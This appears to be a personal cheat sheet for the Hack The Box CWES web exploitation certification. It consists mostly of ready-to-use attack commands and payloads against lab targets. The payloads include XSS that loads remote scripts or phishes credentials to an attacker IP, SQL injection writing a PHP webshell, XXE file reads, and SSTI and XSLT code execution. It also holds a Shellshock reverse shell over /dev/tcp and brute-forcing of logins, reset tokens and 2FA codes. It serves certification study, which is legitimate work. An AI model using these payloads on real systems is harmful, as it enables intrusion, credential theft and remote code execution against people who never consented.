---
title:       "CWES Exam"
summary:     "HTB Certified Web Exploitation Specialist (HTB CWES)"
category:    "Hack The Box"
tags:        [cwes, hack-the-box]
updated:     2026-05-21
---

{% raw %}

HTB CWES cheet sheet. This section describes the commands learned during the CWES, omitting the most basic commands and theoretical parts.

**Information Gathering**

```
RedBlock@htb[/htb]$ whois facebook.com
```

```
RedBlock@htb[/htb]$ dig google.com
```

```
RedBlock@htb[/htb]$ dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

```
RedBlock@htb[/htb]$ dig axfr @nsztm1.digi.ninja zonetransfer.me
```

```
RedBlock@htb[/htb]$ gobuster vhost -u <http://inlanefreight.htb:81> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

```
RedBlock@htb[/htb]$ nikto -h inlanefreight.com -Tuning b
```

```
RedBlock@htb[/htb]$ python3 ReconSpider.py <http://inlanefreight.com>
```

**Web fuzzing**

**Directory and file fuzzing**

```
RedBlock@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <http://IP>:PORT/FUZZ
RedBlock@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/common.txt -u <http://94.237.57.1:42381/webfuzzing_hidden_path/flag/FUZZ.html>
RedBlock@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u <http://IP>:PORT/FUZZ -e .html -recursion -recursion-depth 2 -rate 500
```

**Fuzzing parameters**

```
RedBlock@htb[/htb]$ wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u "<http://IP>:PORT/get.php?x=FUZZ"
RedBlock@htb[/htb]$ ffuf -u <http://IP>:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v
```

**Subdomain fuzz**

```
RedBlock@htb[/htb]$ gobuster vhost -u <http://inlanefreight.htb:81> -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
RedBlock@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Filtering fuzzing output**

```
RedBlock@htb[/htb]$ ffuf -u <http://IP>:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v
RedBlock@htb[/htb]$ ffuf -u <http://IP>:PORT/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "y=FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -v -mc all
```

**API fuzzing**

```
RedBlock@htb[/htb]$ git clone <https://github.com/PandaSt0rm/webfuzz_api.git>
RedBlock@htb[/htb]$ cd webfuzz_api
RedBlock@htb[/htb]$ pip3 install -r requirements.txt
RedBlock@htb[/htb]$ python3 api_fuzzer.py <http://IP>:PORT
```

**Javascript Deofuscation**

To ofuscate js use: [https://obfuscator.io](https://obfuscator.io/)

To deofuscate js use: [https://matthewfl.com/unPacker.html](https://matthewfl.com/unPacker.html)

**Cross-site scripting XSS**

Payloads used during the training

```
<script>alert(window.origin)</script>
<img src="" onerror=alert(window.origin)>
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
<script src="http://OUR_IP/script.js"></script>
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://OUR_IP\\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Automatic tool

```
RedBlock@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```

**SQL injection**

**Basic payloads**

| **Payload** | **URL Encoded** |
|---|---|
| `'` | `%27` |
| `"` | `%22` |
| `#` | `%23` |
| `;` | `%3B` |
| `)` | `%29` |

**More payloads**

```
admin' or '1'='1
admin'--
admin')--
cn' UNION select 1,@@version,3,4-- -
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

**SQLMap Essentials**

```
RedBlock@htb[/htb]$ sqlmap '<http://www.example.com/>' --data 'uid=1&name=test'
RedBlock@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
RedBlock@htb[/htb]$ sqlmap -r req.txt
RedBlock@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --banner --current-user --current-db --is-dba
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --tables -D testdb
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --dump -T users -D testdb
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --dump -T users -D testdb --start=2 --stop=3
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --dump -D master -T users
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --passwords --batch
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/>" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
RedBlock@htb[/htb]$ sqlmap -u "<http://www.example.com/?id=1>" --os-shell
```

**Command Injection**

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|---|---|---|---|
| Semicolon | ; | %3b | Both |
| New Line | \\n | %0a | Both |
| Background | & | %26 | Both (second output generally shown first) |
| Pipe |  |  | %7c |
| AND | && | %26%26 | Both (only if first succeeds) |
| OR |  |  |  |
| Sub-Shell | \`\` | %60%60 | Both (Linux-only) |
| Sub-Shell | $() | %24%28%29 | Both (Linux-only) |

**Injections types**

| **Injection Type** | **Operators** |
|---|---|
| SQL Injection | ' , ; -- /\* \*/ |
| Command Injection | ; && |
| LDAP Injection | \* ( ) & |
| XPath Injection | ' or and not substring concat count |
| OS Command Injection | ; & |
| Code Injection | ' ; -- /\* \*/ (){} #{} %{} ^ |
| Directory Traversal/File Path Traversal | ../ ..\\ %00 |
| Object Injection | ; & |
| XQuery Injection | ' ; -- /\* \*/ |
| Shellcode Injection | \\x \\u %u %n |
| Header Injection | \\n \\r\\n \\t %0d %0a %09 |

**File Upload Attacks**

Webshell.php

```
<?php system($_REQUEST['cmd']); ?>
```

XXS via Exiftool

```
RedBlock@htb[/htb]$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

XXE

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

XXE Remote

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**Server Side**

**SSRF**

```
$ seq 1 10000 > ports.txt
$ ffuf -w ./ports.txt -u <http://172.17.0.2/index.php> -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
RedBlock@htb[/htb]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u <http://172.17.0.2/index.php> -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

**SSTI**

**Jinja**

```
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Twing**

```
{{ _self }}
{{ "/etc/passwd"|file_excerpt(1,-1) }}
{{ ['id'] | filter('system') }}
```

**Automatic Tool**

```
RedBlock@htb[/htb]$ git clone <https://github.com/vladko312/SSTImap=>
RedBlock@htb[/htb]$ cd SSTImap
RedBlock@htb[/htb]$ pip3 install -r requirements.txt
RedBlock@htb[/htb]$ python3 sstimap.py
RedBlock@htb[/htb]$ python3 sstimap.py -u <http://172.17.0.2/index.php?name=test>
```

**SSI Injection**

Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as Apache and IIS.

```
<!--#printenv -->
<!--#exec cmd="id" -->
```

**XLST Injection**

eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.

**LFI**

```
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

**RCE**

```
<xsl:value-of select="php:function('system','id')" />
```

**Login brute force**

**Using Hydra**

```
RedBlock@htb[/htb]$ curl -s -O <https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt>
RedBlock@htb[/htb]$ curl -s -O <https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt>
RedBlock@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Custom wordlists

```
RedBlock@htb[/htb]$ sudo apt install ruby -y
RedBlock@htb[/htb]$ git clone <https://github.com/urbanadventurer/username-anarchy.git>
RedBlock@htb[/htb]$ cd username-anarchy
RedBlock@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
RedBlock@htb[/htb]$ sudo apt install cupp -y
RedBlock@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
RedBlock@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

**Broken authentication**

**Enumerate users**

```
$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u <http://172.17.0.2/index.php> -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

**Brute-Forcing passwords**

```
RedBlock@htb[/htb]$ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
RedBlock@htb[/htb]$ ffuf -w ./custom_wordlist.txt -u <http://172.17.0.2/index.php> -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

**Brute-Forcing Password Reset Tokens**

```
RedBlock@htb[/htb]$ seq -w 0 9999 > tokens.txt
RedBlock@htb[/htb]$ ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

**Brute-Forcing 2FA Codes**

```
RedBlock@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

**Vulnerable Password Reset**

```
<https://github.com/datasets/world-cities/blob/master/data/world-cities.csv>
RedBlock@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
RedBlock@htb[/htb]$ ffuf -w ./city_wordlist.txt -u <http://pwreset.htb/security_question.php> -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
RedBlock@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

**API Attacks**

**Broken authorization**

```
$ for ((i=1; i<= 20; i++)); do
curl -s -w "\\n" -X 'GET' \\
  '<http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'>' \\
  -H 'accept: application/json' \\
  -H 'Authorization: Bearer TOKEN_JWT' | jq
done
```

**Authentication**

```
RedBlock@htb[/htb]$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u <http://94.237.59.63:31874/api/v1/authentication/customers/sign-in> -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
```

**SQLi in parameters**

```
laptop' OR 1=1 --;
```

**GraphQL**

**Introspection**

```
{
  __schema {
    types {
      name
    }
  }
}
```

```
{
   __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

```
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

```
query {
  secrets {
    id
    secret
  }
}
```

IDOR

```
{
  user(username: "test") {
    username
    password
  }
}
```

SQL

```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```

```
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -") {
    username
  }
}
```

Batching attacks

```
[
    {
        "query":"{user(username: \\"admin\\") {uuid}}"
    },
    {
        "query":"{post(id: 1) {title}}"
    }
]
```

Mutations

```
mutation {
  registerUser(input: {username: "vautia", password: "5f4dcc3b5aa765d61d8327deb882cf99", role: "user", msg: "newUser"}) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

**Tools for GraphQL**

[https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop)

[https://github.com/doyensec/inql](https://github.com/doyensec/inql)

**Attacking common applications**

**Wordpress**

Enumetarion

```
$ curl -s -X GET <http://blog.inlanefreight.com> | grep '<meta name="generator"'
RedBlock@htb[/htb]$ curl -s -X GET <http://blog.inlanefreight.com> | sed 's/href=/\\n/g' | sed 's/src=/\\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
RedBlock@htb[/htb]$ curl -s -X GET <http://blog.inlanefreight.com> | sed 's/href=/\\n/g' | sed 's/src=/\\n/g' | grep 'themes' | cut -d"'" -f2
$ curl -s -X GET <http://blog.inlanefreight.com/wp-content/plugins/mail-masta/> | html2text
```

User enumeration

```
RedBlock@htb[/htb]$ curl -s -I <http://blog.inlanefreight.com/?author=1>
RedBlock@htb[/htb]$ curl -s -I <http://blog.inlanefreight.com/?author=100>
RedBlock@htb[/htb]$ curl <http://blog.inlanefreight.com/wp-json/wp/v2/users> | jq
```

Login

```
RedBlock@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" <http://blog.inlanefreight.com/xmlrpc.php>
RedBlock@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" <http://blog.inlanefreight.com/xmlrpc.php>
$ curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" <http://94.237.122.123:34562/xmlrpc.php>
```

WPScan

```
RedBlock@htb[/htb]$ gem install wpscan
RedBlock@htb[/htb]$ wpscan --url <http://blog.inlanefreight.com> --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
```

LFI

```
RedBlock@htb[/htb]$ curl <http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd>
```

WordPress User Bruteforce

```
RedBlock@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url <http://blog.inlanefreight.com>
```

Exploit in metasploit exploit/unix/webapp/wp\_admin\_shell\_upload

**Tomcat CGI**

```
RedBlock@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u <http://10.129.204.227:8080/cgi/FUZZ.cmd>
RedBlock@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u <http://10.129.204.227:8080/cgi/FUZZ.bat>
<http://10.129.204.227:8080/cgi/welcome.bat?&dir>
<http://10.129.204.227:8080/cgi/welcome.bat?&set>
<http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe>
RedBlock@htb[/htb]$ gobuster dir -u <http://10.129.204.231/cgi-bin/> -w /usr/share/wordlists/dirb/small.txt -x cgi
RedBlock@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' <http://10.129.204.231/cgi-bin/access.cgi>
RedBlock@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' <http://10.129.204.231/cgi-bin/access.cgi>
```

**Cloud Funsion**

```
RedBlock@htb[/htb]$ searchsploit adobe coldfusion
<http://example.com/index.cfm?directory=../../../etc/&file=passwd>
<http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd>
RedBlock@htb[/htb]$ searchsploit -p 50057
```

**IIS Enumeration**

```
RedBlock@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 <http://10.129.204.231/>
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
RedBlock@htb[/htb]$ gobuster dir -u <http://10.129.204.231/> -w /tmp/list.txt -x .aspx,.asp
```

**Attacking LDAP**

```
RedBlock@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

{% endraw %}
